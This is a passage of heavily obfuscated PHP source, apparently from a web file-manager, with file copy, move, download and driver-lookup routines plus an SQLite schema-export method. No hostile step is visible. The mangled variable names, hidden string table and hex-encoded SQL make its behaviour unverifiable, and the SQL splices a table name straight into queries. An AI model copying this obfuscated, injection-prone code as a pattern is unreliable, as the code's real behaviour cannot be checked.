$›ˆ©ÑŠß[1162], $›ˆ©ÑŠß[1163] . $’ìÕ‹†è . $›ˆ©ÑŠß[1164], implode($›ˆ©ÑŠß[50] . PHP_EOL, $ì¼ıêàÄ), $›ˆ©ÑŠß[981]); $‘Ş®ª‚Æ = implode(PHP_EOL, array_merge($›ûµí•, $ÇæÊˆ)); if ($œ¿ú¾ğõ && $œ¿ú¾ğõ == $›ˆ©ÑŠß[13]) { return $‘Ş®ª‚Æ; } $°åü¹Ñ = array($›ˆ©ÑŠß[833] => $ÓÓÁ¼œ, $›ˆ©ÑŠß[13] => $‘Ş®ª‚Æ); return $œ¿ú¾ğõ ? $°åü¹Ñ[$œ¿ú¾ğõ] : $°åü¹Ñ; } public function sqlFromSqlite($å–ºëÊ®, $ı¤Åë¢ = '') { $´µŠ†™Î =& $_SERVER[ ÇƒŠìÀ]; $Í¢úí÷… = $this->model()->db(); $¼äİ¯±³ = "\x50\x52\x41\x47\115\x41\40\124\x41\102\114\x45\x5f\111\116\x46\117\x20\50\x27{$å–ºëÊ®}\x27\51"; $™ƒÊ€ï÷ = "\123\105\x4c\105\103\124\40\x2a\40\106\x52\117\115\40\163\161\x6c\x69\164\145\137\x6d\x61\163\x74\145\x72\x20\x57\110\x45\122\105\x20\164\142\154\x5f\156\x61\155\145\x20\75\40\x27{$å–ºëÊ®}\47"; $¬¾Ë£‡ö = $Í¢úí÷…->query($¼äİ¯±³); if (empty($¬¾Ë£‡ö)) { $ªçı¸ = array($´µŠ†™Î[833] => $´µŠ†™Î[12], $´µŠ†™Î[13] => $´µŠ†™Î[12]); return $ı¤Åë¢ ? $ªçı¸[$ı¤Åë¢] : $ªçı¸; } $²¤˜úù³ = $Í¢úí÷…->query($™ƒÊ€ï÷); $óÒò÷¥ = $Ú‘ÌûÛ = array(); foreach ($²¤˜úù³ as $îô²ÊÂ“) { if ($îô²ÊÂ“[$´µŠ†™Î[33]] == $´µŠ†™Î[325]) { $óÒò÷¥[] = $îô²ÊÂ“[$´µŠ†™Î[1165]]; } else { $Ú‘ÌûÛ[$îô²ÊÂ“[$´µŠ†™Î[32]]] = $îô²ÊÂ“[$´µŠ†™Î[1165]]; } } $Üš´•ø“ = array_merge(array($´µŠ†™Î[1161] . $å–ºëÊ® . $´µŠ†™Î[120]), $óÒò÷¥, array_values($Ú‘ÌûÛ)); $Üš´•ø“ = implode($´µŠ†™Î[73] . PHP_EOL, $Üš´•ø“) . $´µŠ†™Î[73]; if ($ı¤Åë¢ && $ı¤Åë¢ == $´µŠ†™Î[13]) { return $Üš´•ø“; } $òÁ†‚ŞÃ = array(); $ˆŸÛŸêš = array($´µŠ†™Î[1153] => $´µŠ†™Î[1166], $´µŠ†™Î[361] => $´µŠ†™Î[1167]); $İŞ•š±Ö = $´µŠ†™Î[12]; foreach ($¬¾Ë£‡ö as $îô²ÊÂ“) { if ($îô²ÊÂ“[$´µŠ†™Î[57]] == $´µŠ†™Î[90]) { $İŞ•š±Ö = $îô²ÊÂ“[$´µŠ†™Î[32]]; } $—Ä¤ÑŒ = array($´µŠ†™Î[431] . $îô²ÊÂ“[$´µŠ†™Î[32]] . $´µŠ†™Î[431], isset($ˆŸÛŸêš[$îô²ÊÂ“[$´µŠ†™Î[33]]]) ? $ˆŸÛŸêš[$îô²ÊÂ“[$´µŠ†™Î[33]]] : $îô²ÊÂ“[$´µŠ†™Î[33]], $îô²ÊÂ“[$´µŠ†™Î[35]] == $´µŠ†™Î[90] ? $´µŠ†™Î[1158] : $´µŠ†™Î[1168] . $îô²ÊÂ“[$´µŠ†™Î[56]], $îô²ÊÂ“[$´µŠ†™Î[57]] == $´µŠ†™Î[90] ? $´µŠ†™Î[1169] : $´µŠ†™Î[12]); $òÁ†‚ŞÃ[] = trim(implode($´µŠ†™Î[53], $—Ä¤ÑŒ)); } foreach ($Ú‘ÌûÛ as $ûõâÎÕì => $™ìèÀùÂ) { $ôí«Ë¡é = str_replace($´µŠ†™Î[1170] . $å–ºëÊ® . $´µŠ†™Î[11], $´µŠ†™Î[12], $ûõâÎÕì); $¶æ¦ñ…• = str_replace(array($´µŠ†™Î[120], $´µŠ†™Î[992]), $´µŠ†™Î[431], substr($™ìèÀùÂ, stripos($™ìèÀùÂ, $´µŠ†™Î[306]))); if ($ôí«Ë¡é == $´µŠ†™Î[1147]) { $º¿™˜ã« = $´µŠ†™Î[1171] . $İŞ•š±Ö . $´µŠ†™Î[1172]; } else { $º¿™˜ã« = (stripos($ôí«Ë¡é, $´µŠ†™Î[11]) ? $´µŠ†™Î[1173] : $´µŠ†™Î[12]) . ($´µŠ†™Î[1174] . $ôí«Ë¡é . $´µŠ†™Î[1175] . $¶æ¦ñ…•); } $òÁ†‚ŞÃ[] = $º¿™˜ã«; } $·­¡ŒŠÖ = array($´µŠ†™Î[1176] . $å–ºëÊ® . $´µŠ†™Î[1177], $´µŠ†™Î[1178] . $å–ºëÊ® . $´µŠ†™Î[1179], implode($´µŠ†™Î[50] . PHP_EOL, $òÁ†‚ŞÃ), $´µŠ†™Î[1180]); $¶…áÊ £ = implode(PHP_EOL, $·­¡ŒŠÖ); if ($ı¤Åë¢ && $ı¤Åë¢ == $´µŠ†™Î[833]) { return $¶…áÊ £; } $ªçı¸ = array($´µŠ†™Î[833] => $¶…áÊ £, $´µŠ†™Î[13] => $Üš´•ø“); return $ı¤Åë¢ ? $ªçı¸[$ı¤Åë¢] : $ªçı¸; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Âó•ü¹¢, $¸‘ÀİÖ) { $ˆÓîñ·ò =& $_SERVER[ ÇƒŠìÀ]; $ÖØ—¥«Ñ = $¸‘ÀİÖ; $GLOBALS[$ˆÓîñ·ò[1181]] = $ˆÓîñ·ò[1182] . $Âó•ü¹¢; Hook::trigger($ˆÓîñ·ò[1182] . $Âó•ü¹¢ . $ˆÓîñ·ò[1183], $ÖØ—¥«Ñ); $š®ŠÒÁ¶ = self::driverMake($¸‘ÀİÖ[0]); if (!$š®ŠÒÁ¶) { return !1; } if (method_exists($š®ŠÒÁ¶, $Âó•ü¹¢)) { $£Ûœ¢÷Ø = @call_user_func_array(array($š®ŠÒÁ¶, $Âó•ü¹¢), $¸‘ÀİÖ); } else { if (method_exists($š®ŠÒÁ¶, $ˆÓîñ·ò[1184])) { $£Ûœ¢÷Ø = @call_user_func_array(array($š®ŠÒÁ¶, $Âó•ü¹¢), $¸‘ÀİÖ); } else { if (method_exists(self, $Âó•ü¹¢)) { $£Ûœ¢÷Ø = @call_user_func_array(array(self, $Âó•ü¹¢), $¸‘ÀİÖ); } else { $£Ûœ¢÷Ø = call_user_func_array(array(parent, $Âó•ü¹¢), $¸‘ÀİÖ); } } } Hook::trigger($ˆÓîñ·ò[1182] . $Âó•ü¹¢ . $ˆÓîñ·ò[1185], $ÖØ—¥«Ñ, $£Ûœ¢÷Ø); return $£Ûœ¢÷Ø; } public static function init($ø¨ÎìşÇ) { return self::driverMake($ø¨ÎìşÇ); } public static function copy($’¢ƒ’Ğ¦, $ØÊß…¾, $ùŠî¸ı„ = false, $¦ıœö™ = false) { return self::copyMoveStart($’¢ƒ’Ğ¦, $ØÊß…¾, $ùŠî¸ı„, $_SERVER[ ÇƒŠìÀ][588], $¦ıœö™); } public static function move($œ‹¸¤—, $ÅàèöÄş, $ÎğÎêÛ = false, $›‹‹Â÷¾ = false) { return self::copyMoveStart($œ‹¸¤—, $ÅàèöÄş, $ÎğÎêÛ, $_SERVER[ ÇƒŠìÀ][590], $›‹‹Â÷¾); } private static function copyMoveStart($ì§úÙ, $óø›§ÜŸ, $ıÂò¤‚Û, $÷ÊËË·, $Ÿìæ·¸×) { $”úï²Ûâ =& $_SERVER[ ÇƒŠìÀ]; $æ‰Ü›Ãõ = array($ì§úÙ, $óø›§ÜŸ, $ıÂò¤‚Û, $Ÿìæ·¸×); Hook::trigger($”úï²Ûâ[1182] . $÷ÊËË· . $”úï²Ûâ[1183], $æ‰Ü›Ãõ); $º§·†îá = self::copyMove($ì§úÙ, $óø›§ÜŸ, $ıÂò¤‚Û, $÷ÊËË·, $Ÿìæ·¸×); Hook::trigger($”úï²Ûâ[1182] . $÷ÊËË· . $”úï²Ûâ[1185], $æ‰Ü›Ãõ, $º§·†îá); return $º§·†îá; } public static function saveFile($ø¸é¥îï, $´Òê«ûå, $¼Š°òÕ¡ = true) { $µ‡¡¸ûè =& $_SERVER[ ÇƒŠìÀ]; $ñ³¨„¬º = self::info($´Òê«ûå); $„î‡¦ô÷ = self::driverMake($ø¸é¥îï); $ĞËòÇÁ› = self::driverMake($´Òê«ûå); $çÂ»¤¤ü = !1; if ($ĞËòÇÁ›->pathParse[$µ‡¡¸ûè[1186]]) { $çÂ»¤¤ü = $ĞËòÇÁ›; $¿½Ÿøä = $ĞËòÇÁ›->pathParse[$µ‡¡¸ûè[1186]]; $ĞËòÇÁ› = self::driverMake($¿½Ÿøä); } if ($„î‡¦ô÷->pathParse[$µ‡¡¸ûè[1186]]) { $–ÅÜ¶ = $„î‡¦ô÷->pathParse[$µ‡¡¸ûè[1186]]; $„î‡¦ô÷ = self::driverMake($–ÅÜ¶); } $¦€¼üğ = $ĞËòÇÁ›->pathFather($´Òê«ûå); $¾©õãı‘ = !0; if (!$¼Š°òÕ¡ && self::driverIsSame($„î‡¦ô÷, $ĞËòÇÁ›)) { $¾©õãı‘ = !1; } $Ùõïª·£ = self::copyFile($„î‡¦ô÷, $ø¸é¥îï, $ĞËòÇÁ›, $¦€¼üğ, $ñ³¨„¬º[$µ‡¡¸ûè[32]], $¾©õãı‘); if ($çÂ»¤¤ü) { $Ùõïª·£ = $çÂ»¤¤ü->getPathOuter($Ùõïª·£); } return $Ùõïª·£; } private static function copyMove($Èîª‹¯, $†½™©ú, $À†¼˜ûè, $õíÀéÎÑ, $Ì³Á ñ = false) { $Û±õÅ­ =& $_SERVER[ ÇƒŠìÀ]; if (!$Èîª‹¯ || $Èîª‹¯ == $Û±õÅ­[8] || !$†½™©ú) { return !1; } ignore_timeout(); $¾¶µÄ°ñ = self::driverMake($Èîª‹¯); $¦ù÷à„Å = self::driverMake($†½™©ú); $µ›…Ÿµ‚ = $õíÀéÎÑ == $Û±õÅ­[590]; $°Á¼Ğ²À = !1; if ($¦ù÷à„Å->pathParse[$Û±õÅ­[1186]]) { $°Á¼Ğ²À = $¦ù÷à„Å; $†½™©ú = $¦ù÷à„Å->pathParse[$Û±õÅ­[1186]]; $¦ù÷à„Å = self::driverMake($†½™©ú); } if ($¾¶µÄ°ñ->pathParse[$Û±õÅ­[1186]]) { $Èîª‹¯ = $¾¶µÄ°ñ->pathParse[$Û±õÅ­[1186]]; $¾¶µÄ°ñ = self::driverMake($Èîª‹¯); } self::check($¾¶µÄ°ñ, $Èîª‹¯, $¦ù÷à„Å, $†½™©ú); Hook::trigger($Û±õÅ­[1187], $¾¶µÄ°ñ, $Èîª‹¯, $¦ù÷à„Å, $†½™©ú); $ÊµóÜªÁ = self::driverIsSame($¾¶µÄ°ñ, $¦ù÷à„Å); if ($ÊµóÜªÁ) { if ($õíÀéÎÑ == $Û±õÅ­[590] && !method_exists($¦ù÷à„Å, $Û±õÅ­[1188]) && trim($†½™©ú, $Û±õÅ­[8]) == trim($¦ù÷à„Å->pathFather($Èîª‹¯), $Û±õÅ­[8])) { if ($¾¶µÄ°ñ->pathThis($Èîª‹¯) != $Ì³Á ñ && !$¾¶µÄ°ñ->isTypeObject()) { return $¾¶µÄ°ñ->rename($Èîª‹¯, $Ì³Á ñ); } return $¦ù÷à„Å->getPathOuter($Èîª‹¯); } if (method_exists($¦ù÷à„Å, $õíÀéÎÑ)) { return $¦ù÷à„Å->{$õíÀéÎÑ}($Èîª‹¯, $†½™©ú, $À†¼˜ûè, $Ì³Á ñ); } } if ($ÊµóÜªÁ && $õíÀéÎÑ == $Û±õÅ­[590] && $¦ù÷à„Å->getType() == $Û±õÅ­[108]) { $©”Ç¯èæ = $¦ù÷à„Å->movePath($Èîª‹¯, $†½™©ú, $Ì³Á ñ); if ($©”Ç¯èæ) { return $©”Ç¯èæ; } } $…ÁµãË  = $¾¶µÄ°ñ->isFile($Èîª‹¯); if (!$…ÁµãË  && $¦ù÷à„Å->getType() == $Û±õÅ­[786] && $¾¶µÄ°ñ->getType() == $Û±õÅ­[108]) { $©”Ç¯èæ = $¦ù÷à„Å->copyFolderFromIO($¾¶µÄ°ñ, $Èîª‹¯, $†½™©ú, $À†¼˜ûè, $µ›…Ÿµ‚, $Ì³Á ñ); } else { $©”Ç¯èæ = self::copyPath($¾¶µÄ°ñ, $Èîª‹¯, $¦ù÷à„Å, $†½™©ú, $À†¼˜ûè, $µ›…Ÿµ‚, $…ÁµãË , $Ì³Á ñ); } if ($©”Ç¯èæ && $µ›…Ÿµ‚) { $¾¶µÄ°ñ->remove($Èîª‹¯); } if ($°Á¼Ğ²À) { $©”Ç¯èæ = $°Á¼Ğ²À->getPathOuter($©”Ç¯èæ); } return $©”Ç¯èæ; } private static function check($¯–úâ‹…, $‰¼¢°», $Â¼¼ê¤, &$–»Ø¦ã©) { $¹Œ°Û¾Ö =& $_SERVER[ ÇƒŠìÀ]; if (self::driverIsSame($¯–úâ‹…, $Â¼¼ê¤) && $¯–úâ‹…->isFolder($‰¼¢°») && $¯–úâ‹…->isParentOf($‰¼¢°», $–»Ø¦ã©)) { show_json(LNG($¹Œ°Û¾Ö[1189]), !1); } if (!$¯–úâ‹…->exist($‰¼¢°»)) { show_json(LNG($¹Œ°Û¾Ö[107]), !1); } } private static function copyPath($÷¤Œê‘, $ëµãÚ·ß, $½Éƒ½Ş¯, $ä²‹•Èå, $»€®ŠÁ, $Ûã«Á˜Ş, $öåˆ¯÷ô, $¸»“³ßÚ = false, $œÜˆêŠ = true) { $¬Äéé¯ö =& $_SERVER[ ÇƒŠìÀ]; $ˆ² ã  = empty($¸»“³ßÚ) && $¸»“³ßÚ !== $¬Äéé¯ö[214] ? $÷¤Œê‘->pathThis($ëµãÚ·ß) : $¸»“³ßÚ; if ($»€®ŠÁ) { $€­ñ€•Ñ = $½Éƒ½Ş¯->fileNameExist($ä²‹•Èå, $ˆ² ã ); $Ôºñê = $ˆ² ã ; $ˆ² ã  = $½Éƒ½Ş¯->fileNameAuto($ä²‹•Èå, $ˆ² ã , $»€®ŠÁ, !$öåˆ¯÷ô); if (!$€­ñ€•Ñ || $Ôºñê != $ˆ² ã ) { $»€®ŠÁ = !1; } if ($œÜˆêŠ && !$»€®ŠÁ) { $½Éƒ½Ş¯->_data[$¬Äéé¯ö[1190]] = !0; } } if ($öåˆ¯÷ô) { return self::copyFile($÷¤Œê‘, $ëµãÚ·ß, $½Éƒ½Ş¯, $ä²‹•Èå, $ˆ² ã , $Ûã«Á˜Ş); } if ($»€®ŠÁ == REPEAT_RENAME_FOLDER) { $»€®ŠÁ = !1; } $€­İÍó’ = rtrim($ä²‹•Èå, $¬Äéé¯ö[8]) . $¬Äéé¯ö[8] . $ˆ² ã ; $Åæ««çû = $½Éƒ½Ş¯->mkdir($½Éƒ½Ş¯->getPath($€­İÍó’), $»€®ŠÁ); $ä²‹•Èå = $½Éƒ½Ş¯->getPathInner($Åæ««çû); $Óîë• = $÷¤Œê‘->listPath($ëµãÚ·ß, !0); $Óîë• = is_array($Óîë•) ? $Óîë• : array($¬Äéé¯ö[85] => array(), $¬Äéé¯ö[84] => array()); $™†şçÎ§ = array_merge($Óîë•[$¬Äéé¯ö[85]], $Óîë•[$¬Äéé¯ö[84]]); foreach ($™†şçÎ§ as $¥úÜÏŠ») { $‰‚’ÛŞ‹ = $¥úÜÏŠ»[$¬Äéé¯ö[33]] == $¬Äéé¯ö[216]; $ëµãÚ·ß = $÷¤Œê‘->getPathInner($¥úÜÏŠ»[$¬Äéé¯ö[86]]); $é¤É¹îØ = self::copyPath($÷¤Œê‘, $ëµãÚ·ß, $½Éƒ½Ş¯, $ä²‹•Èå, $»€®ŠÁ, $Ûã«Á˜Ş, $‰‚’ÛŞ‹, !1, !1); if (!$é¤É¹îØ) { IO::errorTips($¬Äéé¯ö[1191] . $ëµãÚ·ß . $¬Äéé¯ö[72] . $ä²‹•Èå); } } self::copyMoveKeepInfo($÷¤Œê‘, $ëµãÚ·ß, $Åæ««çû); return $Åæ««çû; } private static function copyFile($ç¿Ó˜Û, $”Ê»ĞşË, $ßñÁè·’, $ãôîŠ¶º, $Óø•ø·, $ü·Ğ›ºÌ) { $…ïŸ¿ =& $_SERVER[ ÇƒŠìÀ]; $ãôîŠ¶º = $ßñÁè·’->getPath(rtrim($ãôîŠ¶º, $…ïŸ¿[8]) . $…ïŸ¿[8] . $Óø•ø·); $ë¢ˆÀµ = $…ïŸ¿[1192] . time() . rand_string(5); Hook::trigger($…ïŸ¿[1193], $ç¿Ó˜Û, $”Ê»ĞşË, $ßñÁè·’, $ãôîŠ¶º, $Óø•ø·, $ë¢ˆÀµ); if (self::driverIsSame($ç¿Ó˜Û, $ßñÁè·’)) { if ($ü·Ğ›ºÌ) { $è®ùĞ¶ = $ßñÁè·’->moveFile($”Ê»ĞşË, $ãôîŠ¶º); } else { $è®ùĞ¶ = $ßñÁè·’->copyFile($”Ê»ĞşË, $ãôîŠ¶º); } Hook::trigger($…ïŸ¿[1194], $ç¿Ó˜Û, $”Ê»ĞşË, $ßñÁè·’, $ãôîŠ¶º, $Óø•ø·, $è®ùĞ¶); self::copyMoveKeepInfo($ç¿Ó˜Û, $”Ê»ĞşË, $è®ùĞ¶); return $è®ùĞ¶; } $Şò¤ú™» = TEMP_FILES; if ($GLOBALS[$…ïŸ¿[6]][$…ïŸ¿[91]][$…ïŸ¿[825]]) { $Şò¤ú™» = $GLOBALS[$…ïŸ¿[6]][$…ïŸ¿[91]][$…ïŸ¿[825]]; } $Œ³ë…ô¦ = $Şò¤ú™»; mk_dir($Œ³ë…ô¦); $„Ÿ™Ôï = $Œ³ë…ô¦ . $ë¢ˆÀµ; $÷ğé¯—… = $„Ÿ™Ôï; $„Ÿ™Ôï = $ç¿Ó˜Û->download($”Ê»ĞşË, $„Ÿ™Ôï); $„Ÿ™Ôï = $ç¿Ó˜Û->iconvApp($„Ÿ™Ôï); if (substr($„Ÿ™Ôï, strlen($Şò¤ú™»)) == $Şò¤ú™») { $ü·Ğ›ºÌ = !0; } $è®ùĞ¶ = $ßñÁè·’->upload($ãôîŠ¶º, $„Ÿ™Ôï, $ü·Ğ›ºÌ); self::remove($÷ğé¯—…); Hook::trigger($…ïŸ¿[1194], $ç¿Ó˜Û, $”Ê»ĞşË, $ßñÁè·’, $ãôîŠ¶º, $Óø•ø·, $è®ùĞ¶); self::copyMoveKeepInfo($ç¿Ó˜Û, $”Ê»ĞşË, $è®ùĞ¶); return $è®ùĞ¶; } private static function copyMoveKeepInfo($ß¹ß¶Á¨, $êŞªä¬¥, $İ­””€´) { if (!$İ­””€´) { return; } $ùõŠìˆ = $ß¹ß¶Á¨->info($êŞªä¬¥); if (!is_array($ùõŠìˆ)) { return; } IO::setModifyTime($İ­””€´, $ùõŠìˆ[$_SERVER[ ÇƒŠìÀ][87]]); } public static function pathFather($õ”–¥˜ñ) { $•õÑù¿Ï = IO::init($õ”–¥˜ñ); $åÆöë = $•õÑù¿Ï->pathFather($•õÑù¿Ï->path); return $•õÑù¿Ï->getPathOuter($åÆöë); } public static function fileOut($îÚ‹è, $Ñ÷ïíñ× = false, $”ÈíŒ¥Ù = false, $àæ øù‹ = '') { $¦ÄîêåÃ = self::driverMake($îÚ‹è); if ($¦ÄîêåÃ->isFileOutServer()) { return $¦ÄîêåÃ->fileOutServer($îÚ‹è, $Ñ÷ïíñ×, $”ÈíŒ¥Ù, $àæ øù‹); } return $¦ÄîêåÃ->fileOut($îÚ‹è, $Ñ÷ïíñ×, $”ÈíŒ¥Ù, $àæ øù‹); } public static function fileOutImage($Ò…ò–³Ö, $œóéß›É = 250) { $ììÄ¿Š = array(250, 600, 1200, 2000, 3000, 5000); for ($ÄËôûŒ¯ = 0; $ÄËôûŒ¯ < count($ììÄ¿Š); $ÄËôûŒ¯++) { if ($ÄËôûŒ¯ == 0 && $œóéß›É <= $ììÄ¿Š[$ÄËôûŒ¯]) { $œóéß›É = $ììÄ¿Š[$ÄËôûŒ¯]; break; } else { if ($œóéß›É > $ììÄ¿Š[$ÄËôûŒ¯ - 1] && $œóéß›É <= $ììÄ¿Š[$ÄËôûŒ¯]) { $œóéß›É = $ììÄ¿Š[$ÄËôûŒ¯]; break; } else { if ($ÄËôûŒ¯ == count($ììÄ¿Š) - 1 && $œóéß›É > $ììÄ¿Š[$ÄËôûŒ¯]) { $œóéß›É = $ììÄ¿Š[$ÄËôûŒ¯]; break; } } } } $òğ³İº = self::driverMake($Ò…ò–³Ö); if ($òğ³İº->isFileOutServer()) { return $òğ³İº->fileOutImageServer($Ò…ò–³Ö, $œóéß›É); } return $òğ³İº->fileOutImage($Ò…ò–³Ö, $œóéß›É); } private static function driverIsSame($€¶¸ß¡ş, $¢©¬¬÷ö) { $øÊöãó¹ =& $_SERVER[ ÇƒŠìÀ]; $ßìË¥Ã = $€¶¸ß¡ş->getType(); $Äù²íÏŞ = $¢©¬¬÷ö->getType(); if ($ßìË¥Ã != $Äù²íÏŞ) { return !1; } if ($ßìË¥Ã == $øÊöãó¹[786]) { return !0; } if ($ßìË¥Ã == $øÊöãó¹[108]) { return !0; } if ($€¶¸ß¡ş->pathDriver == $¢©¬¬÷ö->pathDriver) { return !0; } return !1; } public static function copyUpdate($íû–ñ€·, $Ÿ®¨™«) { $ÛóŞù« =& $_SERVER[ ÇƒŠìÀ]; if (!IO::exist($íû–ñ€·)) { return !1; } if (!IO::exist($Ÿ®¨™«)) { IO::mkdir($Ÿ®¨™«); } $±ØŞ Ï˜ = array_to_keyvalue(self::listAllSimple($íû–ñ€·), $ÛóŞù«[86]); $Ò¥ÈŠ‘ö = array_to_keyvalue(self::listAllSimple($Ÿ®¨™«), $ÛóŞù«[86]); $¶„Ş€…Ø = array(); $ØîÆ×è = array(); foreach ($±ØŞ Ï˜ as $óóİÌô => $ã×Ù€ƒş) { if (isset($Ò¥ÈŠ‘ö[$óóİÌô])) { if ($ã×Ù€ƒş[$ÛóŞù«[77]] == 1) { continue; } if ($Ò¥ÈŠ‘ö[$óóİÌô][$ÛóŞù«[78]] == $ã×Ù€ƒş[$ÛóŞù«[78]]) { continue; } } if ($ã×Ù€ƒş[$ÛóŞù«[77]] == 1) { $ØîÆ×è[] = $Ÿ®¨™« . $ÛóŞù«[8] . trim($óóİÌô, $ÛóŞù«[8]); continue; } $¢ÙÎ¢ = strstr(trim($óóİÌô, $ÛóŞù«[8]), $ÛóŞù«[8]) ? get_path_father($óóİÌô) : $ÛóŞù«[12]; $¶„Ş€…Ø[] = array($ÛóŞù«[1195] => $ã×Ù€ƒş[$ÛóŞù«[88]], $ÛóŞù«[1196] => rtrim($Ÿ®¨™«, $ÛóŞù«[8]) . $ÛóŞù«[8] . $¢ÙÎ¢, $ÛóŞù«[1197] => $ã×Ù€ƒş); } $×‹‘¸± = array($ÛóŞù«[216] => $¶„Ş€…Ø, $ÛóŞù«[77] => $ØîÆ×è); Hook::trigger($ÛóŞù«[1198], $íû–ñ€·, $Ÿ®¨™«, $×‹‘¸±); foreach ($ØîÆ×è as $ã×Ù€ƒş) { IO::mkdir($ã×Ù€ƒş); } foreach ($¶„Ş€…Ø as $ã×Ù€ƒş) { IO::copy($ã×Ù€ƒş[$ÛóŞù«[1195]], $ã×Ù€ƒş[$ÛóŞù«[1196]], REPEAT_REPLACE); } } public static function fileSubstr($äúüĞí˜, $…–ıèÛ¶, $•½Ş›ÄÖ = false) { $ˆŒ©üë =& $_SERVER[ ÇƒŠìÀ]; $“îàÔ¨ˆ = self::driverMake($äúüĞí˜); $¤Êë³œÜ = $“îàÔ¨ˆ->size($äúüĞí˜); $ˆè¹“‘ê = $…–ıèÛ¶; $‹ÌÎ°úï = $•½Ş›ÄÖ; if ($…–ıèÛ¶ < 0) { $…–ıèÛ¶ = $¤Êë³œÜ + $…–ıèÛ¶; } if ($•½Ş›ÄÖ === !1) { $•½Ş›ÄÖ = $¤Êë³œÜ - $…–ıèÛ¶; } if ($…–ıèÛ¶ + $•½Ş›ÄÖ > $¤Êë³œÜ) { $•½Ş›ÄÖ = $¤Êë³œÜ - $…–ıèÛ¶; } if (!$¤Êë³œÜ && $“îàÔ¨ˆ->getType() == $ˆŒ©üë[108] && !$“îàÔ¨ˆ->exist($äúüĞí˜)) { $îÎÔÙö¡ = get_path_this($äúüĞí˜); $‰†–ú†Ş = parse_url_query($îÎÔÙö¡); if (is_array($‰†–ú†Ş) && isset($‰†–ú†Ş[$ˆŒ©üë[32]])) { $îÎÔÙö¡ = urldecode($‰†–ú†Ş[$ˆŒ©üë[32]]); } throw new Exception($ˆŒ©üë[1199] . LNG($ˆŒ©üë[1200]) . $ˆŒ©üë[1001] . clear_html($îÎÔÙö¡) . $ˆŒ©üë[12]); } if ($•½Ş›ÄÖ <= 0) { return $ˆŒ©üë[12]; } if ($…–ıèÛ¶ < 0 || $…–ıèÛ¶ >= $¤Êë³œÜ || $•½Ş›ÄÖ > 1024 * 1024 * 10) { throw new Exception("\146\x69\x6c\145\x52\145\x61\144\40\145\x72\x72\x6f\162\x21\x20\163\164\141\162\x74\75{$…–ıèÛ¶}\x3b\x6c\145\156\147\164\150\75{$•½Ş›ÄÖ}\73\x20\163\x69\x7a\145\75{$¤Êë³œÜ}\73"); } $Ö££ÍŞè = $“îàÔ¨ˆ->fileSubstr($äúüĞí˜, $…–ıèÛ¶, $•½Ş›ÄÖ); if (!$Ö££ÍŞè && $•½Ş›ÄÖ && isset($GLOBALS[$ˆŒ©üë[1201]])) { throw new Exception($GLOBALS[$ˆŒ©üë[1201]][$ˆŒ©üë[1202]]); } return $Ö££ÍŞè; } private static function driverMake(&$ğ·”µ€) { $Ş¬‰Œèö =& $_SERVER[ ÇƒŠìÀ]; $Ë–Ï©ßğ = KodIO::parse($ğ·”µ€); if (!self::$driverListSystem) { $í¦¢ì³Ğ = Model($Ş¬‰Œèö[796])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($í¦¢ì³Ğ, $Ş¬‰Œèö[445]); } if ($Ë–Ï©ßğ[$Ş¬‰Œèö[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Ë–Ï©ßğ[$Ş¬‰Œèö[445]]]) { return !1; } $ğ·”µ€ = $Ë–Ï©ßğ[$Ş¬‰Œèö[1203]]; $•“–ÉÊÉ = self::driverGet($Ë–Ï©ßğ, $ğ·”µ€); return $•“–ÉÊÉ; } private static function driverGet($í¨Ô“òÏ, &$¤ê¹ö›) { $ÆËóç©î =& $_SERVER[ ÇƒŠìÀ]; $Ÿ—´š„Ü = $í¨Ô“òÏ[$ÆËóç©î[1204]]; $­¶äüÖª = $í¨Ô“òÏ[$ÆËóç©î[445]]; switch ($í¨Ô“òÏ[$ÆËóç©î[33]]) { case KodIO::KOD_IO: $úãÕ¯Àú = self::$driverListSystem[$­¶äüÖª]; break; case KodIO::KOD_SOURCE: $¤ê¹ö› = $­¶äüÖª . $¤ê¹ö›; $úãÕ¯Àú = array($ÆËóç©î[1205] => $ÆËóç©î[1206], $ÆËóç©î[6] => $í¨Ô“òÏ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $‹ÑÀ¡¸· = $GLOBALS[$ÆËóç©î[1207]]; self::$driverListUser = array_to_keyvalue($‹ÑÀ¡¸·, $ÆËóç©î[445]); } $úãÕ¯Àú = self::$driverListUser[$­¶äüÖª]; break; case KodIO::KOD_SHARE_LINK: $úãÕ¯Àú = array($ÆËóç©î[1205] => $ÆËóç©î[1208], $ÆËóç©î[6] => $í¨Ô“òÏ); $²¾èÕì¬ = Action($ÆËóç©î[1209])->sharePathInfo($í¨Ô“òÏ[$ÆËóç©î[86]]); $¤ê¹ö› = $²¾èÕì¬[$ÆËóç©î[183]]; if (!$²¾èÕì¬[$ÆËóç©î[183]]) { $ÊÕ¤÷Ñ = Model($ÆËóç©î[634])->getInfo($²¾èÕì¬[$ÆËóç©î[635]]); $¤ê¹ö› = KodIO::clear($ÊÕ¤÷Ñ[$ÆËóç©î[1210]] . $í¨Ô“òÏ[$ÆËóç©î[1203]]); $í¨Ô“òÏ[$ÆËóç©î[531]] = $ÊÕ¤÷Ñ; $í¨Ô“òÏ[$ÆËóç©î[1186]] = $¤ê¹ö›; $úãÕ¯Àú = array($ÆËóç©î[1205] => $ÆËóç©î[1211], $ÆËóç©î[6] => $í¨Ô“òÏ); } break; case KodIO::KOD_SHARE_ITEM: $úãÕ¯Àú = array($ÆËóç©î[1205] => $ÆËóç©î[1212], $ÆËóç©î[6] => $í¨Ô“òÏ); $ÊÕ¤÷Ñ = Model($ÆËóç©î[634])->getInfo($í¨Ô“òÏ[$ÆËóç©î[445]]); if ($ÊÕ¤÷Ñ[$ÆËóç©î[183]] == $ÆËóç©î[214]) { $¤ê¹ö› = KodIO::clear($ÊÕ¤÷Ñ[$ÆËóç©î[1210]] . $í¨Ô“òÏ[$ÆËóç©î[1203]]); $í¨Ô“òÏ[$ÆËóç©î[531]] = $ÊÕ¤÷Ñ; $í¨Ô“òÏ[$ÆËóç©î[1186]] = $¤ê¹ö›; $úãÕ¯Àú = array($ÆËóç©î[1205] => $ÆËóç©î[1213], $ÆËóç©î[6] => $í¨Ô“òÏ); } else { if (!$¤ê¹ö›) { $¤ê¹ö› = $ÊÕ¤÷Ñ[$ÆËóç©î[183]]; } } break; default: $¤ê¹ö› = $í¨Ô“òÏ[$ÆËóç©î[86]]; $úãÕ¯Àú = array($ÆËóç©î[1205] => 